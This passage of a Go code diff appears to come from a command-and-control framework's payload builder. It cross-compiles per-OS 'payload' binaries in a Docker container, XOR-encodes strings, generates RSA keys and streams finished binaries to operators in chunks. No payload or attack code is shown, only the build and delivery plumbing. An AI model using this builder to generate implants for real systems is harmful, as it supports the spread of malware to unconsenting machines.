+			fmt.Sprintf("%s/Darwin:/build/Darwin:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/Linux:/build/Linux:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/Windows:/build/Windows:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/shared:/build/shared:ro", hostPayloadsPath),
+		},
+	}
+
+	if err := b.ensureBuilderImage(ctx); err != nil {
+		return "", err
+	}
+
+	filePath := fmt.Sprintf("/shared/%s", binaryName)
+	if err := b.runBuilderContainer(ctx, config, hostConfig); err != nil {
+		return "", err
+	}
+
+	return filePath, nil
+}
+
+func (b *Builder) ensureBuilderImage(ctx context.Context) error {
+	_, _, err := b.dockerClient.ImageInspectWithRaw(ctx, "docker_builder:latest")
+	if err != nil {
+		if client.IsErrNotFound(err) {
+			log.Printf("Builder image not found. Building image...")
+			buildCmd := exec.Command("docker", "compose", "build", "builder")
+			buildCmd.Stdout = log.Writer()
+			buildCmd.Stderr = log.Writer()
+			if err := buildCmd.Run(); err != nil {
+				return fmt.Errorf("failed to build builder image: %v", err)
+			}
+			log.Printf("Builder image built successfully")
+			return nil
+		}
+		return fmt.Errorf("error checking builder image: %v", err)
+	}
+	return nil
+}
+
+func (b *Builder) runBuilderContainer(ctx context.Context, config *container.Config, hostConfig *container.HostConfig) error {
+	resp, err := b.dockerClient.ContainerCreate(ctx, config, hostConfig, nil, nil, "")
+	if err != nil {
+		return fmt.Errorf("container creation failed: %v", err)
+	}
+
+	waiter, err := b.dockerClient.ContainerAttach(ctx, resp.ID, container.AttachOptions{
+		Stream: true,
+		Stdout: true,
+		Stderr: true,
+		Logs:   true,
+	})
+	if err != nil {
+		return fmt.Errorf("failed to attach to container: %v", err)
+	}
+	defer waiter.Close()
+
+	go func() {
+		io.Copy(log.Writer(), waiter.Reader)
+	}()
+
+	if err := b.dockerClient.ContainerStart(ctx, resp.ID, container.StartOptions{}); err != nil {
+		return fmt.Errorf("container start failed: %v", err)
+	}
+
+	statusCh, errCh := b.dockerClient.ContainerWait(ctx, resp.ID, container.WaitConditionNotRunning)
+	select {
+	case err := <-errCh:
+		return fmt.Errorf("container wait failed: %v", err)
+	case status := <-statusCh:
+		if status.StatusCode != 0 {
+			return fmt.Errorf("build failed with status: %d", status.StatusCode)
+		}
+	}
+
+	return nil
+}
+
+func (b *Builder) sendAndCleanup(ctx context.Context, binaryPath string) error {
+	if err := b.sendBinaryFile(ctx, binaryPath, b.clientUsername); err != nil {
+		return fmt.Errorf("failed to send binary: %v", err)
+	}
+
+	if err := os.Remove(binaryPath); err != nil {
+		log.Printf("Failed to delete binary file: %v", err)
+	}
+
+	return nil
+}
+
+func (b *Builder) validateRequest(req PayloadRequest) error {
+	validOS := map[string]string{
+		"darwin":  "darwin",
+		"linux":   "linux",
+		"windows": "windows",
+		"Darwin":  "darwin",
+		"Linux":   "linux",
+		"Windows": "windows",
+	}
+	validArch := map[string]string{
+		"amd64": "amd64",
+		"arm64": "arm64",
+	}
+	validLanguage := map[string]bool{
+		"go":        true,
+		"goproject": true,
+	}
+
+	if _, exists := validOS[req.Data.OS]; !exists {
+		return fmt.Errorf("invalid OS: %s", req.Data.OS)
+	}
+	if _, exists := validArch[req.Data.Arch]; !exists {
+		return fmt.Errorf("invalid architecture: %s", req.Data.Arch)
+	}
+	if !validLanguage[strings.ToLower(req.Data.Language)] {
+		return fmt.Errorf("invalid language: %s", req.Data.Language)
+	}
+	return nil
+}
+
+func xorEncrypt(input, key string) string {
+	var result []byte
+	for i := 0; i < len(input); i++ {
+		result = append(result, input[i]^key[i%len(key)])
+	}
+	return base64.StdEncoding.EncodeToString(result)
+}
+
+func GenerateRSAKeyPair() (*KeyPair, error) {
+	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate RSA key pair: %w", err)
+	}
+
+	privateKeyBytes := x509.MarshalPKCS1PrivateKey(privateKey)
+	privateKeyPEM := pem.EncodeToMemory(&pem.Block{
+		Type:  "RSA PRIVATE KEY",
+		Bytes: privateKeyBytes,
+	})
+
+	publicKeyBytes := x509.MarshalPKCS1PublicKey(&privateKey.PublicKey)
+	publicKeyPEM := pem.EncodeToMemory(&pem.Block{
+		Type:  "RSA PUBLIC KEY",
+		Bytes: publicKeyBytes,
+	})
+
+	return &KeyPair{
+		PrivateKeyPEM: base64.StdEncoding.EncodeToString(privateKeyPEM),
+		PublicKeyPEM:  string(publicKeyPEM),
+	}, nil
+}
+
+func GenerateRandomString(length int) (string, error) {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	result := make([]byte, length)
+	for i := range result {
+		randomInt, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
+		if err != nil {
+			return "", err
+		}
+		result[i] = charset[randomInt.Int64()]
+	}
+	return string(result), nil
+}
+
+// Improved sendBinaryFile
+func (b *Builder) sendBinaryFile(ctx context.Context, filePath string, clientUsername string) error {
+	file, err := os.Open(filePath)
+	if err != nil {
+		log.Printf("Failed to open file: %v", err)
+		return fmt.Errorf("failed to open file: %v", err)
+	}
+	defer file.Close()
+
+	fileInfo, err := file.Stat()
+	if err != nil {
+		log.Printf("Failed to get file info: %v", err)
+		return fmt.Errorf("failed to get file info: %v", err)
+	}
+
+	totalChunks := (fileInfo.Size() + ChunkSize - 1) / ChunkSize
+	buffer := make([]byte, ChunkSize)
+
+	// Send initial notification about binary transfer starting
+	startMsg := struct {
+		Type string `json:"type"`
+		Data struct {
+			FileName    string `json:"file_name"`
+			TotalChunks int64  `json:"total_chunks"`
+			FileSize    int64  `json:"file_size"`
+			Status      string `json:"status"`
+		} `json:"data"`
+	}{
+		Type: "binary_transfer_start",
+		Data: struct {
+			FileName    string `json:"file_name"`
+			TotalChunks int64  `json:"total_chunks"`
+			FileSize    int64  `json:"file_size"`
+			Status      string `json:"status"`
+		}{
+			FileName:    fileInfo.Name(),
+			TotalChunks: totalChunks,
+			FileSize:    fileInfo.Size(),
+			Status:      "starting",
+		},
+	}
+
+	startJSON, _ := json.Marshal(startMsg)
+	b.hubClient.BroadcastToUserHighPriority(ctx, clientUsername, startJSON)
+
+	// Track failed chunks for potential retry
+	failedChunks := make([]int64, 0)
+
+	// Send chunks with better error handling
+	for chunkNum := int64(0); chunkNum < totalChunks; chunkNum++ {
+		// Check context cancellation
+		select {
+		case <-ctx.Done():
+			return fmt.Errorf("context cancelled during chunk transfer")
+		default:
+		}
+
+		bytesRead, err := file.Read(buffer)
+		if err != nil && err != io.EOF {
+			log.Printf("Failed to read chunk %d: %v", chunkNum, err)
+			failedChunks = append(failedChunks, chunkNum)
+			continue // Try next chunk instead of failing entirely
+		}
+
+		if bytesRead == 0 {
+			break
+		}
+
+		chunkData := base64.StdEncoding.EncodeToString(buffer[:bytesRead])
+
+		message := struct {
+			Type        string `json:"type"`
+			ChunkNum    int64  `json:"chunk_num"`
+			TotalChunks int64  `json:"total_chunks"`
+			FileSize    int64  `json:"file_size"`
+			FileName    string `json:"file_name"`
+			Data        string `json:"data"`
+			Priority    bool   `json:"priority"` // Add priority flag
+		}{
+			Type:        "binary_chunk",
+			ChunkNum:    chunkNum,
+			TotalChunks: totalChunks,
+			FileSize:    fileInfo.Size(),
+			FileName:    fileInfo.Name(),
+			Data:        chunkData,
+			Priority:    true, // Mark as high priority
+		}
+
+		messageJSON, err := json.Marshal(message)
+		if err != nil {
+			log.Printf("Failed to marshal chunk message: %v", err)
+			failedChunks = append(failedChunks, chunkNum)
+			continue
+		}
+
+		// Enhanced retry logic with exponential backoff
+		maxRetries := 5
+		sent := false
+		attemptCount := 0
+
+		for attempt := 0; attempt < maxRetries && !sent; attempt++ {
+			attemptCount = attempt
+			// Create a timeout context for each send attempt
+			sendCtx, cancel := context.WithTimeout(ctx, 2*time.Second)
+
+			err = b.hubClient.BroadcastToUserHighPriority(sendCtx, clientUsername, messageJSON)
+			cancel()
+
+			if err == nil {
+				sent = true
+				log.Printf("Sent chunk %d/%d to client %s", chunkNum+1, totalChunks, clientUsername)
+			} else {
+				backoff := time.Duration(math.Pow(2, float64(attempt))) * 100 * time.Millisecond
+				if backoff > 2*time.Second {
+					backoff = 2 * time.Second
+				}
+
+				log.Printf("Failed to send chunk %d (attempt %d/%d): %v, retrying in %v",
+					chunkNum, attempt+1, maxRetries, err, backoff)
+				time.Sleep(backoff)
+			}
+		}
+
+		if !sent {
+			failedChunks = append(failedChunks, chunkNum)
+			log.Printf("Failed to send chunk %d after %d retries", chunkNum, maxRetries)
+		}
+
+		// Adaptive delay between chunks
+		if sent {
+			// Reduce delay if no errors, increase if we had retries
+			if attemptCount == 0 {
+				time.Sleep(25 * time.Millisecond) // Fast path
+			} else {
+				time.Sleep(100 * time.Millisecond) // Slow down if network is congested
+			}
+		}
+	}
+
+	// Report any failed chunks
+	if len(failedChunks) > 0 {
+		log.Printf("Warning: %d chunks failed to send for file %s", len(failedChunks), fileInfo.Name())
+
+		// Send partial completion with error
+		errorMsg := struct {
+			Type string `json:"type"`
+			Data struct {
+				FileName     string  `json:"file_name"`
+				Status       string  `json:"status"`
+				FailedChunks []int64 `json:"failed_chunks"`
+				Message      string  `json:"message"`
+			} `json:"data"`
+		}{
+			Type: "binary_transfer_complete",
+			Data: struct {
+				FileName     string  `json:"file_name"`
+				Status       string  `json:"status"`
+				FailedChunks []int64 `json:"failed_chunks"`
+				Message      string  `json:"message"`
+			}{
+				FileName:     fileInfo.Name(),
+				Status:       "partial",
+				FailedChunks: failedChunks,
+				Message:      fmt.Sprintf("%d chunks failed to transfer", len(failedChunks)),
+			},
+		}
+
+		errorJSON, _ := json.Marshal(errorMsg)
+		b.hubClient.BroadcastToUserHighPriority(ctx, clientUsername, errorJSON)
+
+		return fmt.Errorf("partial transfer: %d chunks failed", len(failedChunks))
+	}
+
+	// Send success completion message
+	completionMsg := struct {
+		Type string `json:"type"`
+		Data struct {
+			FileName string `json:"file_name"`
+			Status   string `json:"status"`
+		} `json:"data"`
+	}{
+		Type: "binary_transfer_complete",
+		Data: struct {
+			FileName string `json:"file_name"`
+			Status   string `json:"status"`
+		}{
+			FileName: fileInfo.Name(),
+			Status:   "success",
+		},
+	}
+
+	completionJSON, _ := json.Marshal(completionMsg)
+	err = b.hubClient.BroadcastToUserHighPriority(ctx, clientUsername, completionJSON)
+	if err != nil {
+		log.Printf("Warning: Failed to send completion message: %v", err)
+	}
+
+	log.Printf("File %s successfully sent with completion notification.", filePath)
+	return nil
+}
